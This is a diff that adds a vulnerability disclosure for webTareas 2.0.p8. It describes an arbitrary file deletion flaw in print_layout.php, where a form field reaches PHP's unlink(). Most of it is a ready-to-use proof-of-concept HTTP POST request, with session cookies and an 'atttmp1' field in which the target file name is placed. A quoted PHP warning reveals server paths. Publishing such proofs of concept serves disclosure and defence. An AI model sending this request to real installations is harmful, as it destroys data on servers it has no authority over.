@@ -1,0 +1,75 @@
+# Exploit Title: webTareas 2.0.p8 - Arbitrary File Deletion
+# Date: 2020-05-02
+# Author: Besim ALTINOK
+# Vendor Homepage: https://sourceforge.net/projects/webtareas/files/
+# Software Link: https://sourceforge.net/projects/webtareas/files/
+# Version: v2.0.p8
+# Tested on: Xampp
+# Credit: İsmail BOZKURT
+
+
+Description:
+--------------------------------------------------------------------------------------
+
+- print_layout.php is vulnerable. When you sent PoC code to the server and
+If there is no file on the server, you can see, this error message
+
+<br />
+<b>Warning</b>:
+ unlink(/Applications/XAMPP/xamppfiles/htdocs/webtareas/files/PrintLayouts/tester.png.php--1.zip):
+No such file or directory in
+<b>/Applications/XAMPP/xamppfiles/htdocs/webtareas/includes/library.php</b>
+on line <b>1303</b><br />
+
+- So, Here, you can delete file with unlink function.
+- And, I ddi try again with another file, I deleted from the server.
+--------------------------------------------------------------------------------------------
+
+Arbitrary File Deletion PoC
+---------------------------------------------------------------------------------------
+
+POST
+/webtareas/administration/print_layout.php?doc_type=11&doc_type_ex=&id=1&mode=edit&borne1=0
+HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 ***********************
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer:
+http://localhost/webtareas/administration/print_layout.php?doc_type=11&doc_type_ex=&mode=edit&borne1=0&id=1
+Content-Type: multipart/form-data;
+boundary=---------------------------3678767312987982041084647942
+Content-Length: 882
+DNT: 1
+Connection: close
+Cookie: webTareasSID=4b6a4799c9e7906a06c574dc48ffb730;
+PHPSESSIDwebERPteam=9b2b068ea2de93ed1ee0aafe27818191
+Upgrade-Insecure-Requests: 1
+
+-----------------------------3678767312987982041084647942
+Content-Disposition: form-data; name="action"
+
+edit
+-----------------------------3678767312987982041084647942
+Content-Disposition: form-data; name="desc"
+
+<p>tester</p>
+-----------------------------3678767312987982041084647942
+Content-Disposition: form-data; name="file1"; filename=""
+Content-Type: application/octet-stream
+
+
+-----------------------------3678767312987982041084647942
+Content-Disposition: form-data; name="attnam1"
+
+
+-----------------------------3678767312987982041084647942
+Content-Disposition: form-data; name="atttmp1"
+
+--add the delete file name here--
+-----------------------------3678767312987982041084647942
+Content-Disposition: form-data; name="sp"
+
+
+-----------------------------3678767312987982041084647942--
